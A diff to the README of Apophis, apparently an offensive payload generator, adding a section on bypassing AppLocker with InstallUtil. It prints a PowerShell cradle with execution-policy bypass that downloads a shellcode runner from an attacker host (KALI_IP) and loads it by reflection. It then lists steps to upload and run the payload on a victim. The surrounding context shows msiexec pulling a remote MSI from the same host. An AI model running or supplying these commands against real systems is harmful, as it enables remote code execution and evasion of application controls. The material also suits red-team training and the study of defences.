@@ -11,6 +11,7 @@ Apep (also spelled Apepi or Aapep) or Apophis (/əˈpoʊfɪs/;[1] Ancient Greek:
 - ASPX, Web.Config 
 - HTA, JS, XSL
 - MSI
+- InstallUtil (.exe)
 
 ## Installation
 ```Apophis``` is using heavily the ```Mono``` project in order to compile the CS templates.
@@ -331,6 +332,23 @@ msiexec /q /i shellcode_runner.msi
 msiexec /q /i http://KALI_IP/shellcode_runner.msi
 ```
 ![image](https://user-images.githubusercontent.com/9944198/158667046-e0f6264e-0cb5-46b9-99e7-0b9775c4bc8f.png)
+
+---
+
+### 1.6 InstallUtil
+There are a lot of methods to bypass Applocker and ```InstallUtil``` is one of them. In some case you can also leverage the ```MSIEXEC``` to tackle this restriction. The template for ```InstallUtil``` is under ```Templates/Applocker/```. If you want to modify the default execution method of the shellcode runner, which is via ```Reflection```, you can edit the ```line 21``` of the Template, and comment/remove the part inside ```Apophis.sh``` that is related to ```InstallUtil``` (line 126).
+
+
+```
+[line 21] String cmd = "powershell -nop -exec bypass -c \"$data=(New-Object Net.WebClient).DownloadData('http://KALI_IP/shellcode_runner.exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))\"";
+```
+
+**Execution Steps:**
+- Upload ```payloads/Applocker/InstallUtil.exe``` to Victim.
+- Execute it: 
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\InstallUtil.exe
+```
 
 ---
 ## 2. Execute .Net Assemblies with Reflection
